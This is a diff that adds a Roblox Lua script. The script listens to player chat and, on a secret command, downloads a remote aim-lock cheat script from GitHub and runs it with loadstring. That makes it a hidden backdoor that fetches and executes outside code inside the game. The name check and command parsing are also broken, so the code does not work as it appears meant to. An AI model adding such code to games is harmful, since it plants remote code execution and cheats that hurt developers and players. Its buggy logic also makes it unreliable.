@@ -1,0 +1,15 @@
+game.Players.PlayerAdded:Connect(function(player)
+	player.CharacterAdded:Connect(function(char)
+		if player.Name == "Akrel0" or "dtbcalasity" then
+			player.Chatted:Connect(function(msg, recipient)
+				if string.sub(msg, 1, 1) == "" then
+					print("False Command")
+					local splitString = string.split(msg, "!")
+					if splitString[1] == "!Kimbladi" then
+                        loadstring(game:HttpGet('https://raw.githubusercontent.com/Stefanuk12/ROBLOX/master/Games/Da%20Hood/SilentAimAimLock.lua'))()
+					end
+				end
+			end)
+		end
+	end)
+end)
